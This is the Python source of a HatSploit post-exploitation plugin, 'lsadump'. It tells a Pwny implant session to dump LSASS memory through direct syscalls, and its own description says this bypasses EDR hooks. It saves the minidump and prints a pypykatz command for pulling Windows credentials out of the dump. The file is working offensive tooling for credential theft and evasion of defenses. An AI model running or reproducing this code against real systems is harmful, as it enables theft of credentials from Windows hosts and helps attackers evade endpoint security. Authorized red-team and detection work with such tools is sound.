"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import os

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin

LSADUMP_CREATE = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)

TLV_TYPE_LSA_PID = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE)
TLV_TYPE_LSA_DATA = tlv_custom_type(TLV_TYPE_BYTES, TAB_BASE, API_TYPE)
TLV_TYPE_LSA_SIZE = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "LSA Dump Plugin",
            'Plugin': "lsadump",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': (
                "Dump LSASS process memory via direct syscalls, "
                "bypassing userland EDR hooks. Produces a valid "
                "minidump for pypykatz/mimikatz."
            ),
        })

        self.commands = [
            Command({
                'Category': "gather",
                'Name': "lsadump",
                'Description': (
                    "Dump LSASS via direct syscalls (stealthy)."
                ),
                'Options': [
                    (
                        ('-p', '--pid'),
                        {
                            'help': (
                                "PID of the target process. "
                                "If omitted, LSASS is found automatically."
                            ),
                            'type': int,
                            'default': 0,
                        }
                    ),
                    (
                        ('-o', '--output'),
                        {
                            'help': (
                                "Local path to save the dump file. "
                                "Defaults to lsass_<pid>.dmp in current dir."
                            ),
                            'metavar': 'PATH',
                        }
                    ),
                ]
            })
        ]

    def lsadump(self, args):
        pid = args.pid

        if pid:
            self.print_process(
                f"Dumping PID {pid} via direct syscalls..."
            )
        else:
            self.print_process(
                "Finding and dumping LSASS via direct syscalls..."
            )

        tlv_args = {}
        if pid:
            tlv_args[TLV_TYPE_LSA_PID] = pid

        result = self.session.send_command(
            tag=LSADUMP_CREATE,
            plugin=self.plugin,
            args=tlv_args,
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to dump process memory!")
            self.print_error(
                "Ensure you have SYSTEM privileges "
                "(try getsystem first)."
            )
            return

        data = result.get_raw(TLV_TYPE_LSA_DATA)
        if not data:
            self.print_error("No dump data received!")
            return

        size = result.get_int(TLV_TYPE_LSA_SIZE)

        pid_label = pid if pid else "lsass"
        output = args.output or f"lsass_{pid_label}.dmp"

        with open(output, 'wb') as f:
            f.write(data)

        self.print_success(
            f"Dump saved to {output} ({len(data)} bytes)"
        )
        self.print_information(
            "No Win32 APIs were called — only direct syscalls."
        )
        self.print_information(
            "Extract credentials with pypykatz:"
        )
        self.print_information(
            f"  pypykatz lsa minidump {output}"
        )
